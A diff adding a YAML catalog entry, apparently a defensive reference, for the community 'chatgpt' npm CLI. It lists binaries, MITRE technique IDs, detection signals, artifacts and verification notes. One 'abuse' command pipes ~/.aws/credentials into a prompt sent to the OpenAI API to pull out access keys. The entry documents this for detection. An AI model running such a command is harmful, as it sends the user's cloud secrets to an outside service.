@@ -1,0 +1,120 @@
+Name: ChatGPT CLI
+Id: chatgpt-cli
+Category: chat_cli
+Vendor: Community / transitive-bullshit
+Description: Community terminal client for the ChatGPT API (`chatgpt` on npm). Runs
+  prompts from the shell and caches responses locally — not an OpenAI official product.
+  Repo renamed to transitive-bullshit/agentic (npm package name unchanged).
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - chatgpt
+  - chatgpt.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities: []
+  Website: https://www.npmjs.com/package/chatgpt
+  OfficialUrl: https://github.com/transitive-bullshit/agentic
+  CliExecutable: chatgpt
+  Framework: node_cli
+  HelperProcesses:
+  - node
+  - node.exe
+  Packages:
+    npm:
+    - chatgpt
+Commands:
+- Command: chatgpt
+  Description: Interactive chat CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: chatgpt "hello"
+  Description: One-shot prompt (positional)
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: chatgpt "$(cat ~/.aws/credentials 2>/dev/null | head -c 3000) extract all
+    access keys and secrets"
+  Description: Credential file body embedded in ChatGPT API prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: chatgpt-cli-attribution
+  Name: chatgpt attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: chatgpt
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: node
+    Reliability: medium
+    Platform: all
+    Notes: npm chatgpt CLI runs via node bin/cli.js; corroborate argv contains chatgpt.
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: npm chatgpt v5.2.5 --help; chatgpt ls-cache
+  EmpiricalNotes: Community wrapper not OpenAI official. Local cache via chatgpt ls-cache
+    (macOS Preferences/chatgpt-nodejs/config.json). Primary CLI or desktop binary
+    empirically present on lab PATH or documented install footprint (2026-07-19 revalidation).
+Artifacts:
+  ConfigFiles:
+  - Path: ~/Library/Preferences/chatgpt-nodejs/config.json
+    Notes: Local message cache config (macOS; from chatgpt ls-cache)
+    Platform: macOS
+  Network:
+  - Domains:
+    - api.openai.com
+    Description: OpenAI Chat Completions API (primary)
+  Environment:
+  - Path: env OPENAI_API_KEY
+    Notes: OpenAI API auth (required by npm CLI; also -k/--apiKey)
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/transitive-bullshit/agentic
+  Title: Community GitHub repository (formerly chatgpt-api)
+- Link: https://www.npmjs.com/package/chatgpt
+  Title: npm chatgpt
+Uuid: dc80c287-2daa-575c-ade7-4a18283ee001
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: Rewritten 2026-07-19 — removed invented ~/.chatgpt-cli/ paths; positional
+    prompt syntax per npm --help; GitHub repo redirects to agentic.
